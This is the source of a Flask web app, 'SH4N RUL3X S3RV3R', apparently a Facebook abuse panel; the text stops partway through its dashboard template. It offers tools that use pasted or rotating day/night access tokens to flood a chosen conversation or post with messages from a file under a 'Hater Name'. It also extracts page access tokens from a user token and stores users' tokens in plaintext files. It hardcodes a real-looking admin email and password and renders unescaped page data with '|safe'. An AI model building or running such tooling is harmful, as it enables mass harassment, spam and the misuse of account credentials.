from flask import Flask, request, render_template_string, redirect, session, url_for
import threading, time, requests, pytz
from datetime import datetime, timedelta
import uuid
import os
import json
from threading import Lock
from typing import List, Dict, Any # Added for new tool

app = Flask(__name__)
app.secret_key = os.urandom(24)  # Secret key for session management

# Admin credentials
ADMIN_USERNAME = "thewstones57@gmail.com"
ADMIN_PASSWORD = "@#(SH9N)#@"

# Storage for tasks and logs with thread safety
stop_events = {}
task_logs = {}
token_usage_stats = {}
task_types = {}
user_tasks = {} # Associates tasks with usernames
data_lock = Lock()  # Lock for thread-safe operations

# Multi-token system storage
user_day_tokens = {}  # {username: [tokens]}
user_night_tokens = {}  # {username: [tokens]}
token_rotation_start_time = {}  # {username: datetime}

# User data file
USERS_FILE = 'users.json'

def load_users():
    """Load users from JSON file"""
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_users(users):
    """Save users to JSON file"""
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f, indent=2)

def save_user_tokens(username, tokens):
    """Save tokens to a file named after the username"""
    filename = f"{username}.txt"
    with open(filename, 'w') as f:
        for token in tokens:
            f.write(f"{token}\n")

def save_user_day_tokens(username, tokens):
    """Save day tokens to a file named after the username"""
    filename = f"{username}_day.txt"
    with open(filename, 'w') as f:
        for token in tokens:
            f.write(f"{token}\n")

def save_user_night_tokens(username, tokens):
    """Save night tokens to a file named after the username"""
    filename = f"{username}_night.txt"
    with open(filename, 'w') as f:
        for token in tokens:
            f.write(f"{token}\n")

def load_user_day_tokens(username):
    """Load day tokens from file"""
    filename = f"{username}_day.txt"
    if os.path.exists(filename):
        try:
            with open(filename, 'r') as f:
                return [line.strip() for line in f.readlines() if line.strip()]
        except:
            return []
    return []

def load_user_night_tokens(username):
    """Load night tokens from file"""
    filename = f"{username}_night.txt"
    if os.path.exists(filename):
        try:
            with open(filename, 'r') as f:
                return [line.strip() for line in f.readlines() if line.strip()]
        except:
            return []
    return []

def load_user_all_tokens(username):
    """Load all tokens from user files (regular, day, night)"""
    all_tokens = []
    
    # Load regular tokens
    filename = f"{username}.txt"
    if os.path.exists(filename):
        try:
            with open(filename, 'r') as f:
                all_tokens.extend([line.strip() for line in f.readlines() if line.strip()])
        except:
            pass
    
    # Load day tokens
    day_filename = f"{username}_day.txt"
    if os.path.exists(day_filename):
        try:
            with open(day_filename, 'r') as f:
                all_tokens.extend([line.strip() for line in f.readlines() if line.strip()])
        except:
            pass
    
    # Load night tokens
    night_filename = f"{username}_night.txt"
    if os.path.exists(night_filename):
        try:
            with open(night_filename, 'r') as f:
                all_tokens.extend([line.strip() for line in f.readlines() if line.strip()])
        except:
            pass
    
    # Remove duplicates while preserving order
    seen = set()
    unique_tokens = []
    for token in all_tokens:
        if token not in seen:
            seen.add(token)
            unique_tokens.append(token)
    
    return unique_tokens

def get_current_token_set(username):
    """Get current active token set based on time (6-hour day/night rotation)"""
    current_time = datetime.now()
    
    # Check if rotation has started for this user
    if username not in token_rotation_start_time:
        token_rotation_start_time[username] = current_time
        return user_day_tokens.get(username, [])
    
    # Calculate elapsed time since rotation started
    start_time = token_rotation_start_time[username]
    elapsed_hours = (current_time - start_time).total_seconds() / 3600
    
    # Determine if we should use day or night tokens (6-hour intervals)
    cycle_position = int(elapsed_hours // 6) % 2
    
    if cycle_position == 0:
        # Day tokens (first 6 hours of each 12-hour cycle)
        return user_day_tokens.get(username, [])
    else:
        # Night tokens (second 6 hours of each 12-hour cycle)
        return user_night_tokens.get(username, [])

def add_log(task_id, log_message):
    with data_lock:
        if task_id not in task_logs:
            task_logs[task_id] = []
        # Keep only logs from the last 30 minutes
        cutoff_time = datetime.now() - timedelta(minutes=30)
        task_logs[task_id] = [log for log in task_logs[task_id] if log['time'] > cutoff_time]
        # Add new log with timestamp
        task_logs[task_id].append({'time': datetime.now(), 'message': log_message})

# =================================================================================
# NEW TOOL: Page Tokens Gen (from pasted_content_2.txt)
# =================================================================================

PAGE_TOKEN_BASE_URL = "https://graph.facebook.com/v17.0/me/accounts"
PAGE_TOKEN_FIELDS = "name,id,access_token"

def mask_token(t: str) -> str:
    """Masks the token for display."""
    if not t:
        return "<empty>"
    if len(t) <= 12:
        return t[0:3] + "..." + t[-3:]
    return t[:6] + "..." + t[-6:]

def fetch_pages(user_token: str) -> List[Dict[str, Any]]:
    """Fetches pages associated with the user token."""
    params = {"fields": PAGE_TOKEN_FIELDS, "access_token": user_token}
    url = PAGE_TOKEN_BASE_URL
    pages: List[Dict[str, Any]] = []
    while url:
        try:
            resp = requests.get(url, params=params if url == PAGE_TOKEN_BASE_URL else None, timeout=15)
        except requests.RequestException:
            return pages

        if resp.status_code != 200:
            return pages

        try:
            data = resp.json()
        except ValueError:
            return pages

        if "data" in data:
            pages.extend(data["data"])
        else:
            break

        paging = data.get("paging", {})
        url = paging.get("next")
        if url:
            time.sleep(0.2)

    return pages

def process_token_for_web(user_token: str) -> str:
    """Processes the token and returns an HTML string of the results."""
    
    if not user_token:
        return "<p class='error'>Error: No token provided.</p>"

    pages = fetch_pages(user_token)
    
    output_html = f"<h2>Results for Token: <code>{mask_token(user_token)}</code></h2>"

    if not pages:
        output_html += "<p class='error'>No pages found or an error occurred during fetching. Check the token and try again.</p>"
        return output_html

    output_html += f"<p class='success'>✔ Found {len(pages)} page(s).</p>"
    output_html += "<div class='page-list'>"
    
    for i, p in enumerate(pages, start=1):
        name = p.get("name", "<no-name>")
        page_id = p.get("id", "<no-id>")
        page_token = p.get("access_token", "<no-access_token>")
        
        output_html += f"""
        <div class='page-card'>
            <h3>Page #{i}</h3>
            <p><strong>Name:</strong> {name}</p>
            <p><strong>ID:</strong> {page_id}</p>
            <p><strong>Page Token:</strong> <code class='token'>{page_token}</code></p>
        </div>
        """
        
    output_html += "</div>"
    return output_html

PAGE_TOKEN_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Pages Token Extractor</title>
    <style>
        .token-detail {
            margin-bottom: 10px;
        }
        .token-detail p {
            margin: 5px 0;
        }
        .token-detail code {
            background-color: rgba(255, 255, 255, 0.1);
            padding: 2px 4px;
            border-radius: 3px;
        }
        /* Reusing the main app's background and font for consistency */
        body {
            background-image: url('https://i.ibb.co/gM0phW6S/1614b9d2afdbe2d3a184f109085c488f.jpg');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            color: #ffffff; 
            font-family: 'Roboto', sans-serif; 
            padding: 20px;
            margin: 0;
        }
        .container {
            max-width: 800px;
            margin: auto;
            background-color: rgba(0, 0, 0, 0.7);
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.5);
        }
        h1 {
            color: #ffffff;
            border-bottom: 2px solid rgba(255, 255, 255, 0.2);
            padding-bottom: 10px;
        }
        h2 {
            color: #ffffff;
        }
        p {
            color: #ccc;
        }
        form {
            background: rgba(255, 255, 255, 0.1);
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        input[type="text"] {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            display: inline-block;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
            background-color: rgba(255, 255, 255, 0.9);
            color: #333;
        }
        input[type="submit"] {
            background-color: #007bff; /* Blue button for consistency */
            color: white;
            padding: 10px 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s;
        }
        input[type="submit"]:hover {
            background-color: #0056b3;
        }
        .page-card {
            border: 1px solid rgba(255, 255, 255, 0.3);
            padding: 15px;
            margin-top: 10px;
            border-radius: 5px;
            background-color: rgba(255, 255, 255, 0.1);
        }
        .page-card h3 {
            color: #ffc107; /* Yellow for page name */
            margin-top: 0;
        }
        .token {
            background-color: rgba(0, 0, 0, 0.8);
            padding: 2px 5px;
            border-radius: 3px;
            font-size: 0.9em;
            color: #28a745; /* Green for tokens */
            word-break: break-all;
        }
        .error {
            color: #dc3545;
            font-weight: bold;
        }
        .success {
            color: #28a745;
            font-weight: bold;
        }
        .back-btn {
            display: inline-block;
            margin-top: 20px;
            padding: 10px 20px;
            background-color: #6c757d;
            color: white;
            text-decoration: none;
            border-radius: 5px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Facebook Pages Token Extractor</h1>
        <p>Enter your Facebook Token To Get Your Page Tokens</p>
        
        <form method="POST">
            <label for="user_token"><strong>User Access Token:</strong></label>
            <input type="text" id="user_token" name="user_token" placeholder="Paste Your Facebook To Get Pages tokens  here" required>
            <input type="submit" value="Fetch Pages">
        </form>
        
        {% if results_html %}
            <hr style="border-color: rgba(255, 255, 255, 0.2);">
            <h2>Extraction Results</h2>
            {{ results_html | safe }}
        {% endif %}
        
        <a href="/" class="back-btn">Back to Dashboard</a>
    </div>
</body>
</html>
"""

@app.route("/page-tokens-gen", methods=["GET", "POST"])
def page_tokens_gen():
    if 'username' not in session:
        return redirect(url_for('login'))
    
    results_html = None
    if request.method == "POST":
        user_token = request.form.get("user_token", "").strip()
        results_html = process_token_for_web(user_token)
        
    return render_template_string(PAGE_TOKEN_TEMPLATE, results_html=results_html)

# =================================================================================
# END NEW TOOL
# =================================================================================

SIGNUP_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign Up</title>
    <style>
        .token-detail {
            margin-bottom: 10px;
        }
        .token-detail p {
            margin: 5px 0;
        }
        .token-detail code {
            background-color: rgba(255, 255, 255, 0.1);
            padding: 2px 4px;
            border-radius: 3px;
        }
        body {
            background-image: url('https://i.ibb.co/gM0phW6S/1614b9d2afdbe2d3a184f109085c488f.jpg');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Arial', sans-serif;
        }
        .signup-container {
            background-color: rgba(255, 255, 255, 0.9);
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
            width: 350px;
            text-align: center;
        }
        .signup-container h2 {
            margin-bottom: 20px;
            color: #333;
        }
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            color: #555;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
        }
        .signup-btn {
            width: 100%;
            padding: 12px;
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        .signup-btn:hover {
            background-color: #218838;
        }
        .error-message {
            color: #dc3545;
            margin-top: 10px;
        }
        .success-message {
            color: #28a745;
            margin-top: 10px;
        }
        .login-link {
            margin-top: 15px;
            display: block;
            color: #007bff;
            text-decoration: none;
        }
        .login-link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="signup-container">
        <h2>Sign Up</h2>
        <form method="POST" action="/signup">
            <div class="form-group">
                <label for="username">Username:</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <div class="form-group">
                <label for="confirm_password">Confirm Password:</label>
                <input type="password" id="confirm_password" name="confirm_password" required>
            </div>
            <button type="submit" class="signup-btn">Sign Up</button>
            {% if error %}
            <div class="error-message">{{ error }}</div>
            {% endif %}
            {% if success %}
            <div class="success-message">{{ success }}</div>
            {% endif %}
        </form>
        <a href="/login" class="login-link">Already have an account? Login</a>
    </div>
</body>
</html>
"""

LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        .token-detail {
            margin-bottom: 10px;
        }
        .token-detail p {
            margin: 5px 0;
        }
        .token-detail code {
            background-color: rgba(255, 255, 255, 0.1);
            padding: 2px 4px;
            border-radius: 3px;
        }
        body {
            background-image: url('https://i.ibb.co/gM0phW6S/1614b9d2afdbe2d3a184f109085c488f.jpg');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Arial', sans-serif;
        }
        .login-container {
            background-color: rgba(255, 255, 255, 0.9);
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
            width: 350px;
            text-align: center;
        }
        .login-container h2 {
            margin-bottom: 20px;
            color: #333;
        }
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            color: #555;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
        }
        .login-btn {
            width: 100%;
            padding: 12px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        .login-btn:hover {
            background-color: #0056b3;
        }
        .error-message {
            color: #dc3545;
            margin-top: 10px;
        }
        .signup-link {
            margin-top: 15px;
            display: block;
            color: #28a745;
            text-decoration: none;
        }
        .signup-link:hover {
            text-decoration: underline;
        }
        .admin-link {
            margin-top: 10px;
            display: block;
            color: #dc3545;
            text-decoration: none;
            font-size: 0.9em;
        }
        .admin-link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Login</h2>
        <form method="POST" action="/login">
            <div class="form-group">
                <label for="username">Username:</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="login-btn">Login</button>
            {% if error %}
            <div class="error-message">{{ error }}</div>
            {% endif %}
        </form>
        <a href="/signup" class="signup-link">Don't have an account? Sign Up</a>
        <a href="/admin-login" class="admin-link">Admin Login</a>
    </div>
</body>
</html>
"""

ADMIN_LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Login</title>
    <style>
        .token-detail {
            margin-bottom: 10px;
        }
        .token-detail p {
            margin: 5px 0;
        }
        .token-detail code {
            background-color: rgba(255, 255, 255, 0.1);
            padding: 2px 4px;
            border-radius: 3px;
        }
        body {
            background-image: url('https://i.ibb.co/gM0phW6S/1614b9d2afdbe2d3a184f109085c488f.jpg');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Arial', sans-serif;
        }
        .login-container {
            background-color: rgba(255, 255, 255, 0.9);
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
            width: 350px;
            text-align: center;
        }
        .login-container h2 {
            margin-bottom: 20px;
            color: #333;
        }
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            color: #555;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
        }
        .login-btn {
            width: 100%;
            padding: 12px;
            background-color: #dc3545;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        .login-btn:hover {
            background-color: #bd2130;
        }
        .error-message {
            color: #dc3545;
            margin-top: 10px;
        }
        .back-link {
            margin-top: 15px;
            display: block;
            color: #007bff;
            text-decoration: none;
        }
        .back-link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Admin Login</h2>
        <form method="POST" action="/admin-login">
            <div class="form-group">
                <label for="username">Username:</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="login-btn">Login</button>
            {% if error %}
            <div class="error-message">{{ error }}</div>
            {% endif %}
        </form>
        <a href="/login" class="back-link">Back to User Login</a>
    </div>
</body>
</html>
"""

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SH4N RUL3X S3RV3R</title>
    <style>
        .token-detail {
            margin-bottom: 10px;
        }
        .token-detail p {
            margin: 5px 0;
        }
        .token-detail code {
            background-color: rgba(255, 255, 255, 0.1);
            padding: 2px 4px;
            border-radius: 3px;
        }
        body {
            background-image: url('https://i.ibb.co/gM0phW6S/1614b9d2afdbe2d3a184f109085c488f.jpg');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            color: #ffffff;
            font-family: 'Roboto', sans-serif;
            margin: 0;
            padding: 20px;
        }
        h1 {
            color: #ffffff;
            text-align: center;
            margin-top: 0;
            padding-top: 20px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
        }
        .content {
            max-width: 900px;
            margin: 0 auto;
            padding: 20px;
            background-color: rgba(0, 0, 0, 0.7);
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.5);
        }
        .section {
            margin-top: 30px;
            padding: 20px;
            background-color: rgba(0, 0, 0, 0.5);
            border-radius: 8px;
            border-left: 4px solid #007bff;
        }
        .section-title {
            color: #ffffff;
            margin-top: 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
            padding-bottom: 10px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-label {
            color: #ffffff;
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
        }
        .form-control {
            width: 100%;
            padding: 12px;
            background-color: rgba(255, 255, 255, 0.9);
            color: #495057;
            border: 1px solid #ced4da;
            border-radius: 6px;
            box-sizing: border-box;
            font-size: 16px;
        }
        .btn {
            padding: 12px;
            margin-top: 10px;
            border: none;
            border-radius: 6px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            font-size: 16px;
            width: 100%;
        }
        .btn:hover {
            opacity: 0.9;
        }
        .btn-primary {
            background-color: #007bff;
            color: white;
        }
        .btn-secondary {
            background-color: #6c757d;
            color: white;
        }
        .btn-danger {
            background-color: #dc3545;
            color: white;
        }
        .btn-success {
            background-color: #28a745;
            color: white;
        }
        .btn-warning {
            background-color: #ffc107;
            color: black;
        }
        .logout-btn {
            position: absolute;
            top: 20px;
            right: 20px;
            padding: 8px 15px;
            background-color: #dc3545;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        textarea {
            min-height: 100px;
        }
        .task-item {
            background-color: rgba(0, 0, 0, 0.5);
            padding: 15px;
            margin-bottom: 15px;
            border-radius: 5px;
            border-left: 4px solid #6f42c1;
        }
        .task-actions {
            display: flex;
            margin-top: 10px;
        }
        .task-actions .btn {
            width: auto;
            flex: 1;
        }
        .nav-tabs {
            display: flex;
            list-style: none;
            padding: 0;
            margin: 0 0 20px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
        }
        .nav-tabs li {
            margin-right: 10px;
        }
        .nav-tabs a {
            display: block;
            padding: 10px 15px;
            background-color: rgba(0, 0, 0, 0.5);
            color: white;
            text-decoration: none;
            border-radius: 5px 5px 0 0;
        }
        /* User Request: Stylish Pink Home Button */
        .nav-tabs li:first-child a {
            background-color: #ff69b4; /* Pink color */
            color: white;
            font-size: 1.1em;
            padding: 12px 20px;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
            transition: all 0.3s ease;
            border: 2px solid #ff1493; /* Deep Pink border */
        }
        .nav-tabs li:first-child a:hover {
            background-color: #ff1493; /* Deep Pink on hover */
            transform: translateY(-2px);
            box-shadow: 0 6px 8px rgba(0, 0, 0, 0.4);
        }
        .nav-tabs li:first-child a.active {
            background-color: #ff1493; /* Deep Pink when active */
            border: 2px solid #ffffff;
        }
        .nav-tabs a.active {
            background-color: rgba(0, 123, 255, 0.7);
            font-weight: bold;
        }
        .tab-content {
            display: none;
        }
        .tab-content.active {
            display: block;
        }
        .tool-section {
            margin-bottom: 20px;
            text-align: center;
        }
        .tool-btn {
            display: inline-block;
            padding: 15px 30px;
            margin: 10px;
            background-color: rgba(255, 165, 0, 0.7);
            color: white;
            text-decoration: none;
            border-radius: 5px;
            font-weight: bold;
            transition: all 0.3s;
        }
        .tool-btn:hover {
            background-color: rgba(255, 140, 0, 0.9);
            transform: scale(1.05);
        }
        .tool-img {
            max-width: 100%;
            border-radius: 5px;
            margin-bottom: 10px;
            max-height: 200px;
            object-fit: cover;
            /* User Request: Red border on tool images */
            border: 3px solid red;
        }
        .developer-section {
            margin-top: 30px;
            padding: 20px;
            background-color: rgba(0, 0, 0, 0.5);
            border-radius: 8px;
            text-align: center;
        }
        .developer-btn {
            display: inline-block;
            padding: 10px 20px;
            margin-top: 10px;
            background-color: #4267B2;
            color: white;
            text-decoration: none;
            border-radius: 5px;
            font-weight: bold;
        }
        .pending-approval {
            background-color: rgba(255, 193, 7, 0.3);
            padding: 15px;
            border-radius: 5px;
            margin: 15px 0;
            text-align: center;
            border-left: 4px solid #ffc107;
        }
        .approved {
            background-color: rgba(40, 167, 69, 0.3);
            padding: 15px;
            border-radius: 5px;
            margin: 15px 0;
            text-align: center;
            border-left: 4px solid #28a745;
        }
        .user-info {
            position: absolute;
            top: 20px;
            left: 20px;
            padding: 8px 15px;
            background-color: rgba(0, 123, 255, 0.7);
            color: white;
            border-radius: 5px;
            font-size: 14px;
        }

        @media (max-width: 768px) {
            .content {
                padding: 15px;
            }
            h1 {
                font-size: 24px;
            }
            .btn {
                padding: 10px;
            }
            .user-info {
                position: relative;
                top: 0;
                left: 0;
                margin-bottom: 15px;
            }
            .logout-btn {
                position: relative;
                top: 0;
                right: 0;
                margin-bottom: 15px;
            }
        }
    </style>
    <script>
        function toggleTokenInput() {
            var option = document.getElementById("tokenOption").value;
            if (option === "single") {
                document.getElementById("singleTokenGroup").style.display = "block";
                document.getElementById("multiTokenGroup").style.display = "none";
            } else if (option === "multi") {
                document.getElementById("singleTokenGroup").style.display = "none";
                document.getElementById("multiTokenGroup").style.display = "block";
            }
        }
        
        function togglePostTokenInput() {
            var option = document.getElementById("postTokenOption").value;
            if (option === "single") {
                document.getElementById("postSingleTokenGroup").style.display = "block";
                document.getElementById("postMultiTokenGroup").style.display = "none";
                document.getElementById("postDayNightTokenGroup").style.display = "none";
            } else if (option === "multi") {
                document.getElementById("postSingleTokenGroup").style.display = "none";
                document.getElementById("postMultiTokenGroup").style.display = "block";
                document.getElementById("postDayNightTokenGroup").style.display = "none";
            } else if (option === "daynight") {
                document.getElementById("postSingleTokenGroup").style.display = "none";
                document.getElementById("postMultiTokenGroup").style.display = "none";
                document.getElementById("postDayNightTokenGroup").style.display = "block";
            }
        }
        
        function showTab(tabId) {
            // Hide all tab contents
            var tabContents = document.getElementsByClassName("tab-content");
            for (var i = 0; i < tabContents.length; i++) {
                tabContents[i].classList.remove("active");
            }
            
            // Deactivate all tab links
            var tabLinks = document.getElementsByClassName("tab-link");
            for (var i = 0; i < tabLinks.length; i++) {
                tabLinks[i].classList.remove("active");
            }
            
            // Show selected tab content and activate its link
            document.getElementById(tabId).classList.add("active");
            event.currentTarget.classList.add("active");
        }
        
        // Initialize on page load
        window.onload = function() {
            toggleTokenInput();
            togglePostTokenInput();
            // Activate first tab by default
            document.querySelector('.nav-tabs li:first-child a').click();
        };
        
        // Auto-refresh tasks every 15 seconds
        setInterval(function() {
            if (document.getElementById('tasks').classList.contains('active')) {
                location.reload();
            }
        }, 15000);
    </script>
</head>
<body>
    <div class="user-info">User: {{ session.get('username', 'Unknown') }}</div>
    <button class="logout-btn" onclick="window.location.href='/logout'">Logout</button>
    <h1>SH4N RUL3X S3RV3R</h1>
    <div class="content">
        {% if not session.get('approved') %}
        <div class="pending-approval">
            <h3>⏳ Pending Approval</h3>
            <p>Your account is waiting for admin approval.Contact With Devloper For pproval</p>
        </div>
        {% else %}
        <div class="approved">
            <h3>YOU ARE APPROVED BY SH4N ✅</h3>
        </div>
        
        {% endif %}
        
        <ul class="nav-tabs">
            <li><a href="#" class="tab-link active" onclick="showTab('home')">HOME</a></li>
        </ul>
        
        <!-- Home Tab -->
        <div id="home" class="tab-content active">
            <div class="tool-section">
                <img src="https://i.ibb.co/21PNHLpM/IMG-20251112-190843.jpg" alt="Convo Tool" class="tool-img">
                <a href="#" class="tool-btn" onclick="showTab('conversations')">CONVO TOOL</a>
            </div>
            
            <div class="tool-section">
                <img src="https://i.ibb.co/Xrtwkrgf/IMG-20251112-191238.jpg" alt="Post Tool" class="tool-img">
                <a href="#" class="tool-btn" onclick="showTab('posts')">POST TOOL</a>
            </div>
            
            <div class="tool-section">
                <img src="https://i.ibb.co/600SDM1y/IMG-20251112-191047.jpg" alt="Token Checker" class="tool-img">
                <a href="#" class="tool-btn" onclick="showTab('token-checker')">TOKEN CHECKER</a>
            </div>
            
            <!-- NEW TOOL BUTTON: Page Tokens Gen -->
            <div class="tool-section">
                <img src="https://i.ibb.co/qF1DxtT1/IMG-20251112-191257.jpg" alt="Page Tokens Gen" class="tool-img">
                <a href="/page-tokens-gen" class="tool-btn">FETCH PAGES</a>
            </div>
            <!-- END NEW TOOL BUTTON -->
                        <div class="tool-section">
                <img src="https://i.ibb.co/Ndr3nFWf/IMG-20251112-192608.jpg" alt="UID Fetcher" class="tool-img">
                <a href="#" class="tool-btn" onclick="showTab('messenger-groups')">UID FETCHER</a>
            </div>
            
            <div class="tool-section">
                <img src="https://i.ibb.co/hFzVrWsQ/IMG-20251112-192643.jpg" alt="Task Manager" class="tool-img">
                <a href="#" class="tool-btn" onclick="showTab('tasks')">TASK MANAGER</a>
            </div>    </div>
            
            <div class="developer-section">
                <h3>Developer</h3>
                <img src="https://i.ibb.co/8nk328Bq/IMG-20251112-192830.jpg" alt="Developer" style="width: 100px; border-radius: 50%;">
                <p>TH3 SH4N</p>
                <a href="https://www.facebook.com/SH33T9N.BOII.ONIFR3" class="developer-btn" target="_blank">Facebook Profile</a>
            </div>
        </div>
        
        <!-- Conversations Tab -->
        <div id="conversations" class="tab-content">
            <div class="section">
                <h2 class="section-title">Conversation Task</h2>
                {% if not session.get('approved') %}
                <div class="pending-approval">
                    <p>❌ You need admin approval to use this tool</p>
                </div>
                {% else %}
                <form method="POST" action="/start-task" enctype="multipart/form-data">
                    <input type="hidden" name="task_type" value="convo">
                    <div class="form-group">
                        <label class="form-label">Token Option:</label>
                        <select name="tokenOption" class="form-control" id="tokenOption" onchange="toggleTokenInput()">
                            <option value="single">Single Token</option>
                            <option value="multi">Multi Tokens</option>
                        </select>
                    </div>
                    <div class="form-group" id="singleTokenGroup">
                        <label class="form-label">Single Token:</label>
                        <input type="text" name="singleToken" class="form-control" placeholder="Enter single token">
                    </div>
                    <div class="form-group" id="multiTokenGroup" style="display:none;">
                        <label class="form-label">Token File:</label>
                        <input type="file" name="tokenFile" class="form-control">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Conversation ID:</label>
                        <input type="text" name="convo" class="form-control" required>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Message File:</label>
                        <input type="file" name="msgFile" class="form-control" required>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Speed:</label>
                        <input type="number" name="interval" class="form-control" required>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Hater Name:</label>
                        <input type="text" name="haterName" class="form-control" required>
                    </div>
                    <button class="btn btn-primary" type="submit">Start</button>
                </form>
                {% endif %}
            </div>
        </div>
        
        <!-- Posts Tab -->
        <div id="posts" class="tab-content">
            <div class="section">
                <h2 class="section-title">Post Comment Task</h2>
                {% if not session.get('approved') %}
                <div class="pending-approval">
                    <p>❌ You need admin approval to use this tool Contact With Devloper</p>
                </div>
                {% else %}
                <form method="POST" action="/start-task" enctype="multipart/form-data">
                    <input type="hidden" name="task_type" value="post">
                    <div class="form-group">
                        <label class="form-label">Token Option:</label>
                        <select name="tokenOption" class="form-control" id="postTokenOption" onchange="togglePostTokenInput()">
                            <option value="single">Single Token</option>
                            <option value="multi">Multi Tokens</option>
                            <option value="daynight">Day/Night Token System</option>
                        </select>
                    </div>
                    <div class="form-group" id="postSingleTokenGroup">
                        <label class="form-label">Single Token:</label>
                        <input type="text" name="singleToken" class="form-control" placeholder="Enter single token">
                    </div>
                    <div class="form-group" id="postMultiTokenGroup" style="display:none;">
                        <label class="form-label">Token File:</label>
                        <input type="file" name="tokenFile" class="form-control">
                    </div>
                    <div class="form-group" id="postDayNightTokenGroup" style="display:none;">
                        <label class="form-label">Day Token File:</label>
                        <input type="file" name="dayTokenFile" class="form-control">
                        <label class="form-label">Night Token File:</label>
                        <input type="file" name="nightTokenFile" class="form-control">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Post URL or ID:</label>
                        <input type="text" name="post_id" class="form-control" placeholder="Enter post URL or ID" required>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Message File:</label>
                        <input type="file" name="msgFile" class="form-control" required>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Speed:</label>
                        <input type="number" name="interval" class="form-control" required>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Hater Name:</label>
                        <input type="text" name="haterName" class="form-control" required>
                    </div>
                    <button class="btn btn-primary" type="submit">Start</button>
                </form>
                {% endif %}
            </div>
        </div>
        
        <!-- Tasks Tab -->
        <div id="tasks" class="tab-content">
